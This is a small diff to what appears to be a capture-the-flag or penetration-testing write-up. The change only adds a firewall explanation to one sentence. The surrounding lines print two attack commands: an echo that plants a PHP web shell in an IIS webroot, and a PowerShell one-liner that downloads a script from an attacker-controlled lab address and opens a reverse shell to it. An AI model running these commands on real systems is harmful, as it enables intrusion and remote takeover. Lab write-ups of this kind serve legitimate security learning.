@@ -135,7 +135,7 @@ echo '<?php SYSTEM($_REQUEST['cmd']); ?>' >> "C:\inetpub\wwwroot\cmd.php"
 
 all failed.
 
-Same goes for any type of reverse shell activity:
+Same goes for any type of reverse shell activity due to the firewall:
 
 ```
 powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.214/Invoke-PowerShell.ps1')); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.214 -Port 443
